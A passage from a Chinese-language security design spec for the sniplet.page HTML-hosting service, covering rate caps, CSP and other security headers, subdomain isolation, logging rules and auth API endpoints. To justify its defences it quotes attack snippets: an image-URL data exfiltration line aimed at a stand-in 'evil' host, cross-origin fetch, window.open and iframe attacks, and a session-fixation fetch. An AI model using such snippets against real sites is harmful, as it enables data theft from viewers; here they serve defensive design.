**全站 `/auth/request` send cap 實作(F-32,v0.8.12)**:
- **威脅**:attacker 手持部分真實 email 清單(breach data / 公司 directory)打 `/auth/request`,即使每封 email 有 per-email 10/day 上限、每 IP 30/day 上限,botnet + 大量 email 仍可累積觸發 Resend 實際發送 → 燒光 Resend 配額,強迫 operator 升 tier / 付費
- **KV key**:`auth_send_daily:<YYYY-MM-DD>`(counter 型 entry,TTL 26 小時)
- **計數時機**:**僅**在 `ctx.waitUntil` 實際呼叫 Resend 的 path 增加(miss path 不計);確保 cap 對應真實成本
- **Peek 時機(B2)**:Turnstile + per-email + per-IP rate limit 通過**之後**、KV email lookup **之前**,先 `METER_KV.get('auth_send_daily:<date>')`;若 >= cap 則回 `503 service_unavailable`
- **為何 peek 在 lookup 之前**:Strategy C 要求「hit / miss 兩 path latency 差 < 5ms」;peek 放在白名單判定前,雙 path 都看到同一個 503 判斷,不 leak whitelist membership
- **Cap 常數**:預設 **100 / day**(對齊 Resend 免費 tier:3000 封/月 ÷ 30 天)。升 Resend Pro($20,50k/月)時 bump 至 ~1500 / day;Scale($90,100k/月)時 ~2500 / day。建議常數化在 Worker code(`AUTH_SEND_DAILY_CAP`),deploy time 調整
- **計數 atomicity**:`GET → +1 → PUT` 非原子,與 §7.17 其他 per-IP/per-email counter 同一 trade-off;burst 窗口可穿幾個 request,但 daily cap 本質是「粗粒度成本保護」,perfect accuracy 非目標
- **Ops observability**:`503` 發生時寫 `auth_global_cap_hit` event(§7.18);dashboard alert「當日首次觸發」→ 判斷是成長 burst 還是攻擊

**Known limitation — KV eventually consistent**:
- KV `GET → INCR → PUT` 非 atomic。Attacker 在 <1 秒內 burst 200 個 requests,可能都讀到舊 counter 後才寫,實測可繞過 per-IP 50/day,在單 IP 吃到 daily cap 1000
- **兜底防禦**:全站 daily cap 1000,attacker 單日最大傷害 = 吃光當日配額
- **v2 升級路徑**:改用 Cloudflare 原生 Rate Limiting Rules(WAF layer,強一致,$5/mo 起),或 Durable Objects counter

### 7.18 Analytics(Workers Analytics Engine)

**原則**:只記 backend metric,**不碰 sniplet 內容,不記 PII,不注入任何 script 到 HTML**。

**Events**:

| Event | Blobs | Doubles | Indexes |
|-------|-------|---------|---------|
| `sniplet_created` | access_mode、country | html_size | date |
| `sniplet_viewed` | access_mode、auth_status | — | date |
| `auth_request_received` | was_on_whitelist(bool) | — | date |
| `auth_verified` | outcome(success/expired/invalid) | — | date |
| `auth_consumed` | outcome(success/replay/invalid) | — | date |
| `slug_postfix_applied` | retry_count | — | date |
| `rate_limit_hit` | endpoint、scope(per-ip/per-email)、reason | — | date |
| `daily_cap_hit` | — | — | date |
| `auth_global_cap_hit` | — | counter_value | date |
| `resend_send_failed` | error_code(Resend 回傳)、quota_exhausted(bool) | — | date |
| `cron_cleanup_success` | — | deleted_count | date |
| `csp_violation` | directive、blocked_host_hash(SHA-256) | — | date |
| `sniplet_404_miss` | ip_hash(HMAC) | — | date |
| `sniplet_mutated` | action(delete/patch)、slug_hash(SHA-256) | — | date |
| `csp_report_rate_limited` | ip_hash(HMAC) | — | date |

**Monitoring alerts**:
- `resend_send_failed` rate > 5% in 5min → ops alert(私享功能可能靜默掛掉)
- 24hr 無 `cron_cleanup_success` → ops alert(過期 sniplet 未清,儲存成本累積)
- `daily_cap_hit` 觸發 → ops alert(評估是否為攻擊 / 需要提升 cap)
- `rate_limit_hit` 單一 IP 爆量 → ops alert
- `csp_violation` > 100/day → ops alert(可能是新 legit CDN 需要加 allowlist,或 abuse 訊號)
- `auth_consumed` outcome=replay > 10/hr → ops alert(magic link 被 scanner / attacker 嘗試 replay,或 `MAGIC_CONSUMED_KV` 一致性 race 發生)
- `auth_global_cap_hit` 當日首次觸發 → ops alert(F-32;評估是合法成長 → 升 Resend tier + bump cap,或是攻擊 → CF firewall rule 處理)
- **`sniplet_404_miss` 單一 ip_hash > 200/hour → ops alert**(F-42,v0.8.15;slug enumeration 訊號;Bot Fight Mode 對低速分散式枚舉不敏感,此 alert 補監控缺口。單 IP 可能是 browser prefetch 或合法誤入;單 IP 高速重試才是攻擊訊號)
- **`sniplet_mutated` 非預期 spike**(F-41,v0.8.15;owner_token 可能已洩漏 + attacker 大量 PATCH / DELETE);baseline 需觀察 2 週後定閾值
- **`csp_report_rate_limited` 單一 ip_hash > 50/hour → ops alert**(F-40,v0.8.15;csp-report 被 flood 訊號)

**查詢方式**:Cloudflare Dashboard → Analytics Engine → SQL API。v1 不做 owner-facing dashboard。

**Privacy 保證**:不記 email 明文、不記 IP、不記 sniplet HTML 內容、不記可識別個人資訊。資料 90 天自動過期。

### 7.19 HTTP Security Headers

所有 sniplet response(`{slug}.sniplet.page/`)、challenge page、apex page 加:

```
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Referrer-Policy: no-referrer
Strict-Transport-Security: max-age=63072000; includeSubDomains
Permissions-Policy: accelerometer=(), autoplay=(), browsing-topics=(), camera=(), clipboard-read=(), display-capture=(), encrypted-media=(), fullscreen=(), geolocation=(), gyroscope=(), hid=(), magnetometer=(), microphone=(), midi=(), payment=(), picture-in-picture=(), publickey-credentials-create=(), publickey-credentials-get=(), screen-wake-lock=(), serial=(), usb=(), web-share=(), xr-spatial-tracking=()
Reporting-Endpoints: csp="https://api.sniplet.page/v1/csp-report"
```

**為何 `Permissions-Policy`(F-38,v0.8.14 加)**:CSP `'unsafe-inline'` 是 product thesis(AI 生成 inline JS),但 CSP 管的是 **script 來源與 connect / form / img 等 fetch-類行為**,**不管 Device API**。Creator HTML 可直接呼叫 `navigator.geolocation.getCurrentPosition(...)`、`navigator.mediaDevices.getUserMedia({video:true})`、`PaymentRequest(...)`、`navigator.credentials.get({publicKey:...})`(WebAuthn phishing)等,這些會在 viewer browser 彈 permission prompt,**配合社交工程完全是 phishing vector**(fake「Video Meeting」畫面觸發 camera prompt,viewer 看到合法 HTTPS domain 同意率不低)。`Permissions-Policy: <feature>=()` 讓該 feature 在此頁 context 完全不可用(prompt 也不會彈),是 CSP 的互補層。清單涵蓋:地理位置 / 相機 / 麥克風 / 支付 / WebAuthn / USB / MIDI / 感測器 / 螢幕錄製 / 剪貼簿讀取 / FLoC (browsing-topics) 等所有敏感 API。`clipboard-read` 禁用但不動 `clipboard-write`(讓 sniplet 能複製資料到使用者剪貼簿,例如「copy this URL」button)。

**統一嚴格 CSP**(所有 sniplet 共用,不分 public / private):

```
Content-Security-Policy:
  default-src 'none';
  script-src 'unsafe-inline' https://cdnjs.cloudflare.com https://cdn.tailwindcss.com;
  style-src 'unsafe-inline' https://cdnjs.cloudflare.com;
  img-src data: blob:;
  font-src data:;
  media-src data: blob:;
  connect-src 'none';
  form-action 'none';
  frame-src 'none';
  frame-ancestors 'none';
  base-uri 'none';
  object-src 'none';
  report-uri https://api.sniplet.page/v1/csp-report;
  report-to csp
```

**雙 reporting 機制**:`report-uri` 是舊 CSP2 指令(Chrome / Firefox / Edge 仍支援,為向後相容保留);`report-to` + `Reporting-Endpoints` header 為 W3C Reporting API 現行標準,Chrome 已完整支援、其他瀏覽器陸續跟進。兩者並存保證所有 client 都能回報。

**CSP 的兩個職責**:

1. **Per-sniplet sandbox**:限制 creator 上傳的 JS 能做什麼。sniplet 本質是 self-contained snapshot,不該對外發請求
2. **Platform abuse 防線**:防止 sniplet.page 被當 phishing / malware / C2 / 廣告刷量 host

**CSP 不負責 cross-sniplet isolation**:那是 subdomain + SOP 的職責(見 §7.20)。

**為何允許 `'unsafe-inline'`**:AI 產的 HTML 幾乎都是 `<script>const data = {...}; new Chart(ctx, data);</script>` 這種 inline 模式。要求每段 inline 轉成 external src 等同於要求上傳多檔案,違背 single-file HTML 定位。Sniplet 接受「creator 寫的 JS 會執行」作為前提,透過限制能 load 什麼、能 connect 哪裡來 contain,**這是 sandbox 思維而非傳統 XSS 防禦思維**。

**為何 `img-src` 只開 `data: blob:`**:防止 `new Image().src = evil + '?' + data` 這類 img URL exfil。Creator 要顯示圖片必須 base64 嵌入,符合 self-contained 定位。

**為何 script-src allowlist 是 cdnjs + cdn.tailwindcss.com**:script-src allowlist 的實質價值是**「takedown 槓桿 + 可偵測性」**,不是擋惡意腳本本身(任何人都能 `npm publish` 惡意 package,jsdelivr / unpkg 作為 npm 自動鏡像立刻供應,allowlist 擋不下)。cdnjs 是這類 CDN 中唯一**人工審核**新收納 package 的,相對於自動 mirror 給攻擊者多一道摩擦。主流 lib(Chart.js、D3、Three.js、React、Vue、Lodash 等)cdnjs 都有;極新或極小眾的 package 可能缺,creator 可改 inline 或選替代品。

**Tailwind Play CDN 例外(`https://cdn.tailwindcss.com`,v0.8.14 加回)**:Tailwind 在 AI 生成 HTML 太常見(landing / dashboard / form 預設選擇),Play CDN 是 v3+ JIT 模式唯一支援的 hosting,cdnjs 只有舊 v2 靜態版。Play CDN 由 Tailwind Labs 直接維護,單一檔案無 npm-style supply chain 風險;但仍是單點(若 cdn.tailwindcss.com 遭 compromise,所有用 Tailwind 的 sniplet 受影響),F-26 風險範圍從 cdnjs 擴大到「cdnjs + tailwindcss」兩處。Tailwind Play CDN 完全 client-side 執行,**不需** `connect-src` 額外允許。`style-src` 不需加 tailwindcss 來源,因為 Play CDN 是用 JS 注入 `<style>`,走 `'unsafe-inline'` 已 cover。

**真正 sandbox 惡意腳本行為的是 `connect-src 'none'` + `img-src data: blob:` + `form-action 'none'`,非 script-src**(script-src 管來源,不管行為)。

**CSP 違規 reporting**:`report-uri` 指向 api.sniplet.page 的 csp-report endpoint,收到時寫 `csp_violation` event(blocked_host 要 hash 不存明文,見 §7.22)。

**附帶屬性 — Service Worker registration 無法成功**:
- Response content-type 為 `text/html` + `X-Content-Type-Options: nosniff` → browser MIME check 拒絕將 response 當作 SW script
- 刻意屬性:sniplet 的 HTML 試圖 `navigator.serviceWorker.register('/')` 必失敗

API `api.sniplet.page/*` 加同樣 headers(XFO、nosniff、Referrer-Policy、HSTS),外加 CORS(預設拒絕跨域;challenge page 的 cross-origin form POST 需特別處理 — 見 §7.20)。

### 7.20 Subdomain Isolation 與 Session 模型

**架構核心**:每個 sniplet 自己的 subdomain → 每個 sniplet 自己的 origin → browser SOP 天然隔離。

**Cross-sniplet 攻擊被 SOP 擋下的路徑**:

| 攻擊 path | 結果 |
|---|---|
| Eve 的 `eve-a7k2` 裡 JS 發 `fetch('https://alice-private-x9m1.sniplet.page/')` | Cross-origin credentialed fetch;browser 會帶上 cookie 送 request,**但 response body JS 讀不到**(CORS 未開)→ 攻擊失敗 |
| `window.open('https://alice-private-x9m1.sniplet.page/')` | Cross-origin window,讀 `w.document` 直接 DOMException → 攻擊失敗 |
| `<iframe src="https://alice-private-x9m1.sniplet.page/">` | Cross-origin iframe,讀 `contentDocument` 被 SOP 擋;加上 `X-Frame-Options: DENY` 連 iframe 載入本身都擋 → 攻擊失敗 |
| Form submit to another subdomain | Cookie 會帶,但 response 讀不到;sniplet 無 state-mutating viewer endpoint,CSRF 無意義 → 攻擊失敗 |

**SOP 讓跨 sniplet 讀取攻擊在結構上不可行**,不需要 Fetch Metadata / COOP 這類軟體層補丁。

**Session cookie 設計(`Domain=sniplet.page`)**:

- Cookie 發給 `.sniplet.page`,browser 自動附在所有 `*.sniplet.page` + apex 的 request 上
- **`api.sniplet.page` Worker MUST 忽略 `st` cookie**:API 只使用 `Authorization: Bearer <owner_token>`,session cookie 雖被 browser 自動帶到 api subdomain,Worker MUST NOT 讀取、解析、或 log 該 cookie。此為「限縮 attack surface」紀律,cookie 存在於 request header 但 API code path 視其不存在
- UX:一次驗證 email → 跨所有 Alice 有權看的 sniplet 共享 session,不需每個 sniplet 重新驗
- 授權:session cookie `sub` 是 HMAC(email),只證明「持有者曾收到該 email 的 magic link」;每個 sniplet 的 `meta.viewers[].h` 獨立判斷該 HMAC 是否在白名單
- **授權 re-check invariant(MUST)**:每次 GET 私享 sniplet 都**必須**重新 load `meta.viewers[].h` 並比對 cookie 的 `sub`(字串相等);**不得**以「cookie 簽章有效 + 曾通過此 sniplet 檢查」快取授權決定。此 invariant 使 PATCH 移除 viewer 下次即生效(無需 server-side revoke list),也是 v1 沒做 JWT revocation 的依據
- Cookie 跨 subdomain 不等於隔離失效:
  - HttpOnly → sniplet HTML 無法讀 `document.cookie`
  - Cross-origin fetch / window.open / iframe → 被 SOP 擋(見上表)
  - Cookie 送到 Eve 的 subdomain,**被平台 Worker code 處理**,viewer HTML 無權接觸 — 平台 code 不可被 viewer 注入

**Challenge page 的 cross-origin form POST**:

Challenge page 託管在 `{slug}.sniplet.page`,但 auth 統一在 apex `sniplet.page`:

- Challenge page 的 form `action="https://sniplet.page/auth/request"` → cross-origin POST
- Apex `/auth/request` 設 `Access-Control-Allow-Origin: https://{origin-from-request}.sniplet.page`(驗 Origin header 屬於 `*.sniplet.page`)與 `Access-Control-Allow-Credentials: true`
- Browser 做 CORS preflight,通過後送實際 POST
- **或** challenge page 可以直接做 `POST` via fetch with `credentials: 'include'`,cookie 會自動帶(用於後續查 Alice 是否已 verified)

此 CORS 開放僅限 `/auth/request`,其他 api endpoint 仍預設拒絕跨域。

**v2 Team tier 的殘留跨 sniplet 風險**:若未來 `{team}.sniplet.page/{slug}` 形式,team 內所有 sniplet 共用 `{team}.sniplet.page` origin,**team 內部就會回到 v0.8.9 時代的 same-origin 威脅模型**。Team tier 假設「team 內成員互信」,此時需要重新引入 Fetch Metadata / 更嚴 CSP 等軟體層防線(這些機制在 v0.8.10 移除但仍有 know-how 留存)。

### 7.21 TTL 機制
- GET 時 lazy 檢查 `expires_at`,過期回 404(不回 410,避免洩漏「曾存在過」)
- 每日 UTC 02:00 Cron Worker 清理過期 R2 物件 + EMAIL_INDEX_KV 對應條目

### 7.22 Logging Hygiene

Cloudflare Workers 的 `console.log` 與 Analytics Engine 的 `writeDataPoint` 資料可在 dashboard 被查看。以下資料 **MUST NOT** 進入任何 log / analytics event:

| 不記 | 原因 |
|------|------|
| `Authorization` header 的 `owner_token` 內容 | 洩漏 = 第三方可刪 / 改任何 sniplet |
| `Cookie` header(含 session JWT `st`) | 洩漏 = 冒充 viewer;**全部 Worker(含 api、apex、sniplet subdomain)MUST NOT log 整個 `Cookie` header**,即使是 debug / error trace;api Worker 應完全略過 cookie parsing |
| URL query `?t=<magic_token>` | 洩漏 = 15 分鐘內可奪取 session |
| `RESEND_API_KEY`、`TURNSTILE_SECRET`、`SESSION_JWT_SECRET`、`MAGIC_JWT_SECRET`、`EMAIL_HASH_SECRET`、`IP_HASH_SECRET` | 洩漏 = 根本性 compromise |
| Viewer email 明文(`/auth/request` body、PATCH `add`/`remove` body) | 違反隱私原則;這些 endpoint 收到後 MUST 即時 `normalize → HMAC`,後續只處理 HMAC,不保留明文於任何 log / trace |
| Creator IP 明文 | 若要記 abuse,用 HMAC hash |
| Sniplet HTML 內容 | 可能含機密 |
| 任何 request/response body 原文 | 含上述資料的風險 |
| CSP violation report 中的 `blocked-uri` 明文 | 可能含外部 URL 含 query string 含 sensitive data;SHA-256 hash 後再記 |

**允許記錄的**:
- HTTP method、path(去識別化 slug,例如 `/***`)
- Status code、latency
- Error code(machine-readable,如 `invalid_token`)
- Geo country(cf.country)— 供 analytics 用
- Hash 過的 IP / email / slug / blocked-uri(for abuse correlation)

**Analytics Engine `writeDataPoint` 規則**:
- blobs 不放 PII、不放 secrets
- Event 設計前先 review

**CF 平台層 edge log**:
- **CF Log Push 必須未啟用**,或啟用時 `Authorization` header 在 drop list
- Workers Trace 預設會 capture request headers,code 內 `console.log(request.headers)` 也會 — 禁用
- 若 CF edge log 洩漏 owner_token,`/security` page 將此明列為 SEV-1 incident(§10.7)

**如何實作**:
- 所有 `console.log` 集中經過 sanitize helper
- Secrets 用 env binding 存取,不在 code 字串化
- Error handler 捕捉到 exception 時,只 log error type + endpoint,不 log stack trace 中可能含 request 資料的部分
## 8. API Spec

### 8.0 通用 POST invariants(v0.8.14 加,F-37 / F-35)

所有狀態改變的 POST endpoint MUST 套用以下檢查,順序為「Content-Type → Origin(僅 apex auth endpoints)→ body schema → 業務邏輯」。不符合者在解析 body **之前**就拒絕,避免 CSRF 與 content-type confusion。

**Content-Type enforcement(F-37)**:

| Endpoint | 接受的 Content-Type | 不符 → |
|---|---|---|
| `POST /v1/sniplets` | `application/json` | 400 `invalid_content_type` |
| `PATCH /v1/sniplets/:slug/viewers` | `application/json` | 400 `invalid_content_type` |
| `POST /auth/request` | `application/json` | 400 `invalid_content_type` |
| `POST /auth/consume` | `application/json` | 400 `invalid_content_type` |
| `POST /auth/logout` | 無 body,不檢 CT | — |
| `POST /v1/csp-report` | `application/csp-report` **或** `application/json` | 400 `invalid_content_type` |

解析前即比對 `Content-Type` header 字串(容許 `; charset=utf-8` 等 parameter)。拒絕 `text/plain`、`application/x-www-form-urlencoded`、`multipart/form-data`,因為這些 CT 可以透過 `<form enctype="...">` 做 simple CORS request(不觸發 preflight),為 CSRF 的經典突破口。

**Origin enforcement(F-35 / F-30)**:

| Endpoint | 接受的 Origin | 不符 → |
|---|---|---|
| `POST /auth/logout` | `https://sniplet.page` 或 `https://{postfixed-slug}.sniplet.page` | 400 `invalid_origin`(已有,F-30) |
| `POST /auth/consume` | `https://sniplet.page` 一家(僅來自 apex 的 verify page) | 400 `invalid_origin`(v0.8.14 加,F-35) |
| `POST /auth/request` | `https://sniplet.page` 或 `https://{postfixed-slug}.sniplet.page`(已於 CORS 邏輯反射) | CORS preflight 即擋下 |
| `POST /v1/sniplets`、PATCH / DELETE | 無 Origin 限制(agent / curl / server-to-server 合法客戶端通常不帶 Origin) | — |
| `POST /v1/csp-report` | 無 Origin 限制(browser 產生時 Origin 通常是 `null` 或 cross-origin) | — |

**為何** `/v1/sniplets` 類 agent-facing endpoint **不**強制 Origin:agent / curl / CI 等合法 client 不一定帶 Origin header,強制會擋真流量;這類 endpoint 依賴 owner_token + rate limit + Turnstile(auth-side)防濫用。

**共通錯誤**:
- 400 `invalid_content_type`:CT 不在該 endpoint 接受清單
- 400 `invalid_origin`:Origin 不在該 endpoint 接受清單

### `POST /v1/sniplets` (via `api.sniplet.page`)

**Request**:
```json
{
  "html": "<!DOCTYPE html>...",
  "slug": "q3-sales-dashboard",
  "viewers": ["alice@co.com", "bob@co.com"]   // optional, null/缺省 = 公開, 上限 3(Free tier)
}
```

**Response 200**:
```json
{
  "slug": "q3-sales-dashboard-a7k2",            // 一律含 postfix
  "url": "https://q3-sales-dashboard-a7k2.sniplet.page",
  "expires_at": "2026-04-25T14:30:00Z",
  "owner_token": "ot_...",
  "access": "public",
  "viewers_masked": ["a***@co.com", "b***@co.com"] | null   // gated 才有;明文 email 不回傳
}
```

**注意**:
- response 的 `slug` / `url` **一律包含 4 字元 postfix**,與 request slug 必定不同。**Client 必須以 response 為準**,不要用 request slug 構造 URL。
- **response 不回明文 email**,只回 `viewers_masked`(格式 `{first-char}***@{domain}`);creator 應自行記得自己加了誰,server 不保留明文可還原(§7.9 F-11)

**Errors**(完整見 §16):
- 400 `invalid_format` / `reserved_slug` / `viewers_exceeded` / `viewers_empty`
- 429 `rate_limited`(per-IP 超過 50/day)
- 451 `blocked_content`
- 500 `slug_retry_exhausted`
- 503 `daily_cap_exceeded`(全站 1000/day)

### Owner 操作驗證順序(F-33,v0.8.12 — PATCH / DELETE 共用)

為防 slug enumeration oracle(`401 invalid_token` vs `404 not_found` 的 free oracle),兩個 owner endpoint MUST 遵循以下順序:

1. 讀 R2 `meta.json`
2. **Constant-time 比對** owner_token hash:
   - 若 meta 不存在(slug 無效)→ 用預先計算好的 **dummy hash** 跑一次 constant-time 比對,讓 latency 與 slug 存在時一致
   - 若 meta 存在但 hash 不符 → 不通過
3. 上述 2 中任一不通過 → 統一回 `401 invalid_token`(**不**區分「slug 不存在」與「token 錯」)
4. 通過後再檢 `expires_at`,過期回 `410 expired`(**僅在此階段可見**,已是 valid owner)
5. 執行實際 DELETE / PATCH 邏輯

**此設計影響**:真正 owner 若打錯 slug,會收到 401 而非 404;v1 接受此 debug 體驗退化作為 enumeration 防護的代價。

### `PATCH /v1/sniplets/:slug/viewers`
**Header**: `Authorization: Bearer <owner_token>`

**Request**:
```json
{
  "add": ["carol@co.com"],     // optional
  "remove": ["bob@co.com"]     // optional
}
```

**Response 200**:
```json
{
  "viewers_masked": ["a***@co.com", "c***@co.com"] | null,
  "access": "public" | "email-gated"
}
```

**語意**:
- creator 自由切換 public / email-gated。Remove 到空 → 回 public(`viewers_masked: null`)。因為 CSP 不分 access mode 統一嚴格,**切換不會影響 HTML 行為**。
- **明文 email 永不回傳**;`remove` 時 server 對輸入 email 做 `normalize → HMAC`,再與 `meta.viewers[].h` 比對移除。若某 email 的 HMAC 不在白名單,該項靜默略過(不洩漏「該 email 從未加過」)。
- `add` 時 server 同樣 `normalize → HMAC`,若已存在則不重複加。

**Side effects**:
- 更新 EMAIL_INDEX_KV
- **寫 `sniplet_mutated { action: "patch", slug_hash: SHA-256(slug) }` Analytics event**(F-42,v0.8.15;owner_token 洩漏時可從此 event 查異常 spike,不洩漏明文 slug)

**Errors**(完整見 §16):
- 400 `invalid_format` / `viewers_exceeded` / `empty_request`
- 401 `invalid_token`(token 缺失 / 錯誤 / slug 不存在 — 統一為 unauthorized,F-33)
- 410 `expired`(僅在 valid token 驗證通過後可能回傳)

### `DELETE /v1/sniplets/:slug`
**Header**: `Authorization: Bearer <owner_token>`
**Side effects**:
- 刪 R2、清 EMAIL_INDEX_KV
- **寫 `sniplet_mutated { action: "delete", slug_hash: SHA-256(slug) }` Analytics event**(F-42,v0.8.15)

**Response**: 204 No Content

**Errors**(完整見 §16):
- 401 `invalid_token`(token 缺失 / 錯誤 / slug 不存在 — 統一為 unauthorized,F-33)
- 410 `expired`(僅在 valid token 驗證通過後可能回傳)

### `GET /` on `{slug}.sniplet.page`

1. Worker 從 `request.url.hostname` 解析 slug
2. 讀 R2 meta.json → 檢 TTL(過期回 404)
3. **公開**(`meta.viewers === null`)→ serve HTML + 統一嚴格 CSP + 其他 security headers
4. **私享**(`meta.viewers !== null`):
   - 無 cookie → 回 challenge page(HTTP 200)
   - 有 cookie → 驗 session JWT(強制 `purpose === "session"`)→ 比對 viewers → 通過則 serve,不通過回 challenge page
5. 不存在 → 404

**Cache-Control**:一律 `no-store`(v0.8.10 移除 edge cache)

### `GET /` 與 `GET /SKILL.md` on apex `sniplet.page`
- **永遠回 SKILL.md text/plain**(v0.8.13 取消 Accept 分流)
- Headers:`Content-Type: text/plain; charset=utf-8`、`Content-Disposition: inline; filename="SKILL.md"`、`Cache-Control: public, max-age=3600`
- 兩個 path 共用同一份 SKILL.md(內嵌 Worker bundle)
- 規格詳見 §10.2

### `POST /auth/request` (apex)
**Request**:
```json
{ "email": "alice@co.com", "return_to": "https://q3-private-m8f1.sniplet.page/", "turnstile_token": "..." }
```

**CORS**:
- `Access-Control-Allow-Origin`:動態鏡射 request 的 `Origin`,但**僅當** Origin 符合 `^https://[a-z0-9](?!.*--)[a-z0-9-]{6,43}[a-z0-9]\.sniplet\.page$`(對應 postfixed slug 長度 8–45 字元,與 §8 `return_to` 驗證 regex 一致)
- `Access-Control-Allow-Credentials: true`
- OPTIONS preflight 支援

**實作要點**:
1. 驗 Turnstile → fail 回 400 `turnstile_failed`
2. 檢 per-email rate limit(3/hr、10/day)+ per-IP rate limit(30/day per /64)→ fail 回 429 `rate_limited`
3. **Peek 全站 send cap(F-32,v0.8.12)**:`METER_KV.get('auth_send_daily:<UTC-date>')` ≥ cap → 503 `service_unavailable`。**必須在步驟 4 之前**,以保 hit / miss 兩 path 都看到同一判斷(不 leak whitelist)
4. normalize email(trim + lowercase)→ HMAC → KV lookup
5. 若 hit:**`ctx.waitUntil(async () => { await resend.send(...); await incrementAuthSendCounter() })`**,response 立刻返回,不等 Resend;counter +1 僅在實際 send path 發生
6. 若 miss:silently skip,response 立刻返回
7. **兩個 path latency 差 < 5ms**,消除 timing side channel

**Response**:
- 通過 Turnstile + rate limit + send cap → 200 `{ "status": "sent" }`(不論 email 在不在白名單)
- Turnstile 失敗 → 400 `turnstile_failed`
- Rate limit 超過 → 429 `rate_limited`
- 全站 send cap 達到 → 503 `service_unavailable`(F-32)

**為何一定要 `ctx.waitUntil`**:若同步呼叫 Resend,hit path 延遲 200-500ms,miss path 延遲 ~50ms。Attacker 量 timing 即可區分 email 是否在白名單,完全繞過 Strategy C。`ctx.waitUntil` 是 CF Workers 原生支援的 defer 機制,response 不等 promise 完成。

### `GET /auth/verify?t=<token>&r=<return_to>` (apex) — 確認頁,**不 consume token**

**步驟**:
1. **不驗 token、不 consume、不 set cookie**
2. 回傳 HTML 確認頁,顯示:「You're about to sign in to view a sniplet. Click Continue to proceed.」
3. 頁面內含:
   - 一個 `<button id="continue">` Continue button
   - Inline JS:點擊時 `POST /auth/consume { t, r }` with `credentials: 'include'`,response 拿到 `{ redirect }` 後 `window.location = redirect`
   - 不 reveal `t` 值給 DOM(放在 JS closure 內)
4. 確認頁 response 加 `Cache-Control: no-store`

**為何這樣設計**:防止 email security scanner(Microsoft Defender Safe Links、Google Workspace 等)自動 GET `/auth/verify` 時意外 consume 掉 token。Scanner 做 GET,看到 HTML 確認頁就結束,不會模擬 button click + POST。

### `POST /auth/consume` (apex) — 實際 verify + set cookie

**Request**(v0.8.14 F-36 簡化:移除 body `r`,`return_to` 以 JWT claim 為準):
```json
{ "t": "<magic-jwt>" }
```

**前置檢查**(§8.0 通用 invariants):
- `Content-Type: application/json` → 不符 400 `invalid_content_type`(F-37)
- `Origin === "https://sniplet.page"` → 不符 400 `invalid_origin`(F-35,v0.8.14 加)
  - **為何**:`/auth/consume` 只該從 apex verify page(§10.4)被 fetch;擋 **session fixation CSRF**(Eve 的 sniplet HTML 若 `fetch('https://sniplet.page/auth/consume', {...Content-Type:'text/plain'...})` 試圖用 Eve 的 magic token 換 session cookie 塞進受害者 browser,Origin 不符即擋)

**步驟**:
1. 驗 magic JWT(`MAGIC_JWT_SECRET` 驗簽 + `purpose === "magic"` + `exp` 未過期 + algorithm MUST === `HS256`)
2. 檢查 `MAGIC_CONSUMED_KV[jti]`:
   - 存在 → 回 422 `already_consumed`
   - 不存在 → 寫入 `MAGIC_CONSUMED_KV[jti] = 1`,TTL 16 分鐘
3. **從 JWT claim 取 `return_to`**(F-36,v0.8.14):不接受 body `r`;JWT 由 server 於 `/auth/request` 階段簽署,`return_to` 是**原始可信值**,任何 URL 層 tampering(email 轉寄時被改 `&r=`、browser 歷程被改、中間人改 query)都不影響此處
4. 驗 `jwt.return_to`(validateReturnTo 邏輯,見下方)— 失敗則 `return_to` 視為 `https://sniplet.page/`
5. 簽 session JWT(`SESSION_JWT_SECRET`,`purpose: "session"`)
6. `Set-Cookie: st=<jwt>; HttpOnly; Secure; SameSite=Lax; Domain=sniplet.page; Path=/; Max-Age=604800`
   - **Domain=sniplet.page**:cookie 跨 `*.sniplet.page` + apex 共享,支援 §5 情境 E 的 session 重用
7. 回 200 `{ "redirect": "<return_to>" }`

**Errors**:
| HTTP | Error | 觸發 |
|---|---|---|
| 400 | `invalid_content_type` | Content-Type 非 `application/json`(F-37) |
| 400 | `invalid_origin` | Origin 非 `https://sniplet.page`(F-35) |
| 400 | `invalid_format` | body 結構錯 |
| 401 | `invalid_token` | JWT 簽章 / purpose / algorithm 不符 |
| 410 | `token_expired` | JWT exp 過期 |
| 422 | `already_consumed` | jti 已在 KV 中 |

**return_to 嚴格驗證邏輯**(防 open redirect):
```ts
function validateReturnTo(r: string): boolean {
  // MUST:
  // 1. 不為空
  // 2. 可解析為 URL(absolute)
  // 3. protocol === 'https:'
  // 4. hostname === 'sniplet.page' OR hostname 匹配 {slug}-{postfix}.sniplet.page 格式
  // 5. pathname === '/'
  // 6. 無 query string、無 fragment
  
  try {
    const url = new URL(r);
    if (url.protocol !== 'https:') return false;
    if (url.search || url.hash) return false;
    if (url.pathname !== '/') return false;
    if (url.hostname === 'sniplet.page') return true;
    // 匹配 {slug}.sniplet.page 格式(slug 含 postfix,長度 8–45 字元)
    return /^[a-z0-9](?!.*--)[a-z0-9-]{6,43}[a-z0-9]\.sniplet\.page$/.test(url.hostname);
  } catch {
    return false;
  }
}
```

驗證失敗 → `return_to` 設為 `https://sniplet.page/`(不 leak 原因,不 error)。

### `POST /auth/logout` (apex)
**目的**:主動結束 session,清除 cookie。

**Request**:無 body(cookie 會自動帶)

**CSRF 防護(MUST,v0.8.11 S-6)**:
- 必驗 `Origin` header;符合以下兩條任一才處理,否則回 `400 invalid_origin`:
  - `Origin === "https://sniplet.page"`(從 apex page 或 Challenge page 呼叫 — 跨 origin 但在自家)
  - `Origin` 符合 `^https://[a-z0-9](?!.*--)[a-z0-9-]{6,43}[a-z0-9]\.sniplet\.page$`(從合法 sniplet subdomain,含 postfix 格式)
- 理由:`SameSite=Lax` 不擋 logout CSRF(`Set-Cookie: Max-Age=0` 無條件清 cookie,即使請求不帶舊 cookie);Origin check 是最低成本有效防線
- **瀏覽器 POST 100% 帶 Origin**,合法 logout 不會被誤擋;v1 無 mobile / server-to-server 呼叫 logout 的場景

**Response**:
- 200 `{ "status": "logged_out" }`
- `Set-Cookie: st=; HttpOnly; Secure; SameSite=Lax; Domain=sniplet.page; Path=/; Max-Age=0`

**備註**:v1 不做 server-side JWT revocation(其他 device 上的 cookie 仍 valid 至 7 天 exp,與 sniplet TTL 對齊;v0.8.13 從 30 天縮)。見 §12 風險 F-29 討論 cookie 外洩情境;裝置遺失的 nuclear 選項是 `SESSION_JWT_SECRET` 輪換(RUNBOOK §2.2),v2 評估 JWT revoke list。

### `POST /v1/csp-report` (via `api.sniplet.page`)

**目的**:接收瀏覽器自動寄送的 CSP 違規 report,寫入 Analytics Engine `csp_violation` event(§7.18)。

